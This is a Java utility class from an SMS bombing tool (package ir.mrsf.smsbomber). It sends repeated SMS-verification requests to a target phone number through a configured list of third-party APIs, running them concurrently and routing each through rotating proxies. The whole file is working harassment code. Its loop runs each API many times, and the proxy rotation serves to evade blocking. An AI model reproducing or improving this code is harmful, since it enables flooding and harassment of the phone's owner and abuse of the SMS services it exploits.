package ir.mrsf.smsbomber.utils;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonPrimitive;
import ir.mrsf.smsbomber.SMSBomber;
import ir.mrsf.smsbomber.enums.ContentType;
import ir.mrsf.smsbomber.enums.Method;
import ir.mrsf.smsbomber.managers.ProxyManager;
import ir.mrsf.smsbomber.models.API;
import lombok.experimental.UtilityClass;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.function.Consumer;

@UtilityClass
public class RequestUtil {
    private static final Gson gson;
    private static ProxyManager proxyManager;

    static {
        gson = new Gson();
        proxyManager = null;
    }

    public void sendSMSRequest(ExecutorService executor, String phone) {
        try {

            final List<API> apiList = SMSBomber.getSmsBomber().getConfigManager().getApiList();
            for (API api : apiList) {
                final Object payload = api.payload();
                ContentType contentType;
                String body;
                if (payload instanceof JsonObject payloadJson) {
                    body = gson.toJson(payloadJson, JsonObject.class);
                    contentType = ContentType.JSON;
                } else if (payload instanceof JsonPrimitive jsonPrimitive && jsonPrimitive.isString()) {
                    contentType = ContentType.www_form_urlencoded;
                    body = jsonPrimitive.getAsString();
                } else {
                    contentType = null;
                    body = null;
                }
                if (api.method() == Method.POST) {
                    if (contentType == null) continue;
                    if (body == null) continue;
                }
                final String phoneNumber;
                if (api.withOutZero()) {
                    phoneNumber = phone.replaceFirst("^0+", "");
                } else {
                    phoneNumber = phone;
                }
                for (int i = 0; i < api.repeat(); i++) {
                    switch (api.method()) {
                        case POST -> executor.submit(() -> smsRequest(StringUtil.setPlaceHolder(phoneNumber, api.url())
                                , contentType, StringUtil.setPlaceHolder(phoneNumber, body),
                                (integer) -> sendLog(api.name(), integer)
                        ));
                        case GET -> executor.submit(() -> smsRequest(StringUtil.setPlaceHolder(phoneNumber, api.url()),
                                (integer) -> sendLog(api.name(), integer)
                        ));
                        default -> throw new RuntimeException("Invalid method");
                    }
                }
                Thread.sleep(100);
            }
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    private void sendLog(String name, int responseCode) {
        System.out.println("Sent from: " + name + " status: " + responseCode);
    }

    private void smsRequest(String url, ContentType contentType, String body, Consumer<Integer> callback) {
        try {
            Thread.sleep(500);
            final byte[] postData = body.getBytes(StandardCharsets.UTF_8);
            final HttpURLConnection connection = getHttpURLConnectionSMS(url, contentType, postData);

            try (OutputStream outputStream = connection.getOutputStream()) {
                outputStream.write(postData);
            }

            callback.accept(connection.getResponseCode());
        } catch (Exception ignored) {
            callback.accept(500);
        }
    }

    private void smsRequest(String url, Consumer<Integer> callback) {
        try {
            Thread.sleep(500);
            proxyManager = SMSBomber.getSmsBomber().getProxyManager();
            final HttpURLConnection connection = (HttpURLConnection) new URL(url).
                    openConnection(proxyManager.getNextProxy());
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(3000);
            connection.setReadTimeout(3000);
            callback.accept(connection.getResponseCode());
        } catch (Exception ignored) {
            callback.accept(500);
        }
    }


    private HttpURLConnection getHttpURLConnectionSMS(String url, ContentType contentType, byte[] postData) throws IOException {
        proxyManager = SMSBomber.getSmsBomber().getProxyManager();
        final HttpURLConnection connection = (HttpURLConnection) new URL(url).
                openConnection(proxyManager.getNextProxy());
        connection.setDoOutput(true);
        connection.setInstanceFollowRedirects(false);
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", contentType.getString());
        connection.setRequestProperty("charset", "utf-8");
        connection.setRequestProperty("Content-Length", Integer.toString(postData.length));
        connection.setUseCaches(false);
        return connection;
    }
}
